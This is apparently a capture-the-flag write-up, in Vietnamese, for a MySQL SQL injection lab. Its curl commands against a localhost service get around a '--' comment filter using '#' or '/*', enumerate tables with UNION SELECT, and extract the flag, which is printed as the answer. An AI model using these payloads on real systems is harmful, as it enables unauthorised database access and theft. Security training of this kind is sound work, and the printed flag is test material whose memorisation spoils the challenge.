# SQLi-048: MySQL Comment Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Comment bypass với `#` hoặc `/**/`  
**DBMS:** MySQL  
**Flag:** `FLAG{c0mm3nt_h4sh_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test bình thường
curl "http://localhost:5048/profile?user=admin"

# Test với -- comment
curl "http://localhost:5048/profile?user=admin'--"
# → "SQL comment syntax '--' is blocked!"
```

## 🎯 Bước 2: BYPASS

```bash
# Sử dụng # thay vì --
curl "http://localhost:5048/profile?user=admin'%23"
# → Bypass thành công! (URL encode # = %23)

# Hoặc sử dụng /* */
curl "http://localhost:5048/profile?user=admin'/*"
```

## 🔢 Bước 3: ENUMERATE

```bash
# UNION với # comment
curl "http://localhost:5048/profile?user=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()%23"
# → profiles, secrets, flags
```

## 🏆 Bước 4: EXFILTRATE

```bash
curl "http://localhost:5048/profile?user=' UNION SELECT 1,name,value FROM flags%23"
```

🎉 **FLAG:** `FLAG{c0mm3nt_h4sh_byp4ss}`

## ✅ Flag

```
FLAG{c0mm3nt_h4sh_byp4ss}
```
